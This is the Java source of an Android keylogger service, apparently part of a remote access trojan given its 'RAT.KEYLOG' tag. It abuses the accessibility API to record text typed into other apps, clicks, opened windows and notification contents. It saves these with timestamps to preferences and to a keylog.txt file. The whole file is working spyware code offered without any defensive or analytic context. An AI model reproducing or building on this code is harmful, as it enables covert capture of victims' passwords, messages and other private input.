package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "RAT.KEYLOG";
    private static final int MAX_LOGS = 1000;
    private String lastPackage = "";
    private String lastText = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Keylogger connected");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int type = event.getEventType();
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String cls = event.getClassName() != null ? event.getClassName().toString() : "";

            if (pkg.equals(getPackageName())) return;

            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence text = event.getText() != null && event.getText().size() > 0
                    ? event.getText().get(0) : "";
                if (text != null && text.length() > 0) {
                    String currentText = text.toString();
                    if (!currentText.equals(lastText) || !pkg.equals(lastPackage)) {
                        logKey(pkg, cls, currentText);
                        lastText = currentText;
                        lastPackage = pkg;
                    }
                }
            }

            if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                CharSequence text = event.getText() != null && event.getText().size() > 0
                    ? event.getText().get(0) : "";
                if (text != null && text.length() > 0) {
                    logKey(pkg, cls, "[CLICK] " + text.toString());
                }
            }

            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (!cls.equals(lastPackage)) {
                    logKey(pkg, cls, "[OPEN]");
                    lastPackage = cls;
                }
            }

            if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                CharSequence text = event.getText() != null && event.getText().size() > 0
                    ? event.getText().get(0) : "";
                if (text != null) {
                    logKey(pkg, cls, "[NOTIF] " + text.toString());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent error: " + e.getMessage());
        }
    }

    private void logKey(String pkg, String cls, String text) {
        try {
            SharedPreferences sp = getSharedPreferences("KeylogPrefs", MODE_PRIVATE);
            String existing = sp.getString("logs", "[]");
            JSONArray arr = new JSONArray(existing);
            JSONArray newArr = new JSONArray();
            int start = Math.max(0, arr.length() - MAX_LOGS + 1);
            for (int i = start; i < arr.length(); i++) newArr.put(arr.get(i));

            JSONObject entry = new JSONObject();
            entry.put("pkg", pkg);
            entry.put("cls", cls);
            entry.put("text", text);
            entry.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            newArr.put(entry);
            sp.edit().putString("logs", newArr.toString()).apply();

            try {
                File logFile = new File(getFilesDir(), "keylog.txt");
                FileWriter fw = new FileWriter(logFile, true);
                fw.write("[" + pkg + "] " + text + "\n");
                fw.close();
            } catch (Exception ignored) {}

            Log.d(TAG, "[" + pkg + "] " + text);
        } catch (Exception e) {
            Log.e(TAG, "logKey error: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger interrupted");
    }
}